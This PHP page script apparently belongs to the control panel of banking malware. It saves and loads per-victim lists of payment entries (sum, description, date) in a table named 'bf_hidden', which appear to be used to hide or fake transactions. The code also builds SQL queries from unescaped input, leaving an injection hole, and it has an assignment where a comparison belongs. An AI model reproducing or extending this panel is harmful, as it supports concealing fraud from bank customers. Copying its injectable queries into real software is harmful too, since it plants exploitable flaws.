<?php

$smarty->assign('rand_name', mt_rand(0000000000, 9999999999));

$gen = true;

if($_SESSION['user']->config['infoacc'] == '1'){
    if($_SESSION['user']->config['systems']['rafa'] != true){
        $gen = false;
        header('Location: /logs/');
        exit;
    }
}


if(!empty($Cur['str']) && $gen == true){
    $matches = explode('0', $Cur['str'], 2);
    if(!empty($matches[0]) && !empty($matches[1])){
        $prefix = $matches[0];
        $uid = '0' . $matches[1];
    }
    
    if(!empty($_SESSION['user']->config['userid'])){
        $log = $mysqli->query('SELECT * from bf_hidden WHERE (userid = \''.$_SESSION['user']->config['userid'].'\') AND (prefix = \''.$prefix.'\') AND (uid = \''.$uid.'\') AND (system = \'rafa\') LIMIT 1', null, null);
    }else{
        $log = $mysqli->query('SELECT * from bf_hidden WHERE (prefix = \''.$prefix.'\') AND (uid = \''.$uid.'\') AND (system = \'rafa\') LIMIT 1', null, null);
    }   
    
    if($log->prefix == $prefix && $log->uid = $uid){   
        if(count($_POST['data']) > 0){
            foreach($_POST['data'] as $key => $item){
                if(empty($item['paysumm']) && empty($item['paydescr']) && empty($item['paydate'])) unset($_POST['data'][$key]);
            }
            sort($_POST['data']);
            $log->data = base64_encode(gzdeflate(json_encode($_POST['data'])));
            $mysqli->query('update bf_hidden set data = \''.$log->data.'\' WHERE (id = \''.$log->id.'\') LIMIT 1');
            
        }
        
        $ed = false;
        
        if(!empty($log->data)){
            $log->data = base64_decode($log->data );
            if(!empty($log->data)){
                $log->data  = gzinflate($log->data );
                if($log->data  != false){
                    $log->data  = json_decode($log->data, true);
                }
            }
        }
        
        if(count($log->data) < 1){
            $log->data = array();
            $log->data[0] = array();
            
            $log->data[0]['paysumm'] = '';
            $log->data[0]['paydescr'] = '';
            $log->data[0]['paydate'] = '';
        }

        $smarty->assign('log', $log);
    }
}

?>